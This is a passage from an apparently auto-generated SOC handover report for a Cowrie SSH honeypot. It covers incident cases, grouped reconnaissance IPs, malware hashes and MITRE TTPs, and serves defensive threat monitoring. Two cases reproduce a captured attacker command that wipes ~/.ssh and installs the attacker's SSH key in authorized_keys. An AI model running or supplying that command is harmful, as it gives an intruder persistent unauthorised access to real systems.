| `2026-04-17 10:33:42` | `cowrie.command.failed` |
| `2026-04-17 10:33:42` | `cowrie.log.closed` |
| `2026-04-17 10:33:43` | `cowrie.session.params` |
| `2026-04-17 10:33:43` | `cowrie.command.input` |
| `2026-04-17 10:33:43` | `cowrie.session.file_download` |
| `2026-04-17 10:33:43` | `cowrie.log.closed` |
| `2026-04-17 10:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aaee2ebae5a

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:33 |
| **Last Seen** | 2026-04-17 10:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:33:45` | `cowrie.session.connect` |
| `2026-04-17 10:33:45` | `cowrie.client.version` |
| `2026-04-17 10:33:45` | `cowrie.client.kex` |
| `2026-04-17 10:33:46` | `cowrie.login.success` |
| `2026-04-17 10:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a5a55450bed

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:35 |
| **Last Seen** | 2026-04-17 10:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:35:12` | `cowrie.session.connect` |
| `2026-04-17 10:35:12` | `cowrie.client.version` |
| `2026-04-17 10:35:12` | `cowrie.client.kex` |
| `2026-04-17 10:35:13` | `cowrie.login.success` |
| `2026-04-17 10:35:13` | `cowrie.session.params` |
| `2026-04-17 10:35:13` | `cowrie.command.input` |
| `2026-04-17 10:35:13` | `cowrie.command.failed` |
| `2026-04-17 10:35:14` | `cowrie.log.closed` |
| `2026-04-17 10:35:14` | `cowrie.session.params` |
| `2026-04-17 10:35:14` | `cowrie.command.input` |
| `2026-04-17 10:35:14` | `cowrie.session.file_download` |
| `2026-04-17 10:35:14` | `cowrie.log.closed` |
| `2026-04-17 10:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ba3a58f752

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:35 |
| **Last Seen** | 2026-04-17 10:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:35:16` | `cowrie.session.connect` |
| `2026-04-17 10:35:16` | `cowrie.client.version` |
| `2026-04-17 10:35:16` | `cowrie.client.kex` |
| `2026-04-17 10:35:17` | `cowrie.login.success` |
| `2026-04-17 10:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-490473c319e4

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:38 |
| **Last Seen** | 2026-04-17 10:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:38:06` | `cowrie.session.connect` |
| `2026-04-17 10:38:06` | `cowrie.client.version` |
| `2026-04-17 10:38:06` | `cowrie.client.kex` |
| `2026-04-17 10:38:07` | `cowrie.login.success` |
| `2026-04-17 10:38:07` | `cowrie.session.params` |
| `2026-04-17 10:38:07` | `cowrie.command.input` |
| `2026-04-17 10:38:07` | `cowrie.command.failed` |
| `2026-04-17 10:38:07` | `cowrie.log.closed` |
| `2026-04-17 10:38:08` | `cowrie.session.params` |
| `2026-04-17 10:38:08` | `cowrie.command.input` |
| `2026-04-17 10:38:08` | `cowrie.session.file_download` |
| `2026-04-17 10:38:08` | `cowrie.log.closed` |
| `2026-04-17 10:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-181b096f1930

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:38 |
| **Last Seen** | 2026-04-17 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:38:10` | `cowrie.session.connect` |
| `2026-04-17 10:38:10` | `cowrie.client.version` |
| `2026-04-17 10:38:10` | `cowrie.client.kex` |
| `2026-04-17 10:38:11` | `cowrie.login.success` |
| `2026-04-17 10:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `171.25.158[.]82` | **25** | 2026-04-17 10:00 | 2026-04-17 10:38 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.87[.]166` | **23** | 2026-04-17 10:03 | 2026-04-17 10:23 | 37m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.79.191[.]76` | **14** | 2026-04-17 09:23 | 2026-04-17 09:46 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.234.53[.]69` | **13** | 2026-04-17 09:23 | 2026-04-17 09:42 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `58.229.141[.]26` | **13** | 2026-04-17 09:23 | 2026-04-17 09:42 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **6** | 2026-04-17 10:25 | 2026-04-17 10:31 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `93.48.24[.]181` | **3** | 2026-04-17 09:23 | 2026-04-17 09:25 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `35.202.9[.]133` | **2** | 2026-04-17 09:25 | 2026-04-17 09:28 | 1m | 0 | `T1592` | 🟢 LOW |
| `115.190.106[.]110` | 1 | 2026-04-17 10:03 | 2026-04-17 10:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.36.58[.]228` | 1 | 2026-04-17 10:03 | 2026-04-17 10:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.77.222[.]234` | 1 | 2026-04-17 09:41 | 2026-04-17 09:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-04-17 10:59 | 2026-04-17 10:59 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `171.25.158[.]82` | SE | Vaxjo NET C2IP | **100** ⚠️ | 6 |
| `93.48.24[.]181` | IT | Fastweb SpA | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `35.202.9[.]133` | US | Google LLC | **100** ⚠️ | 50 |
| `115.190.106[.]110` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.87[.]166` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 14 |
| `58.229.141[.]26` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `210.79.191[.]76` | ID | PT Kebun Nara Santosa | **100** ⚠️ | 50 |
| `103.234.53[.]69` | HK | 45 Des Voeux Road, Central | **100** ⚠️ | 5 |
| `121.36.58[.]228` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 154 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 70 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 60 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 32 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 167 cases |
| Tool 34  | Credential Extractor        | ✅ 132 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (1.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 61 priority case(s) shown individually · 12 recon entry/entries in table (8 group(s) consolidating 99 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-17T11:02:10Z_
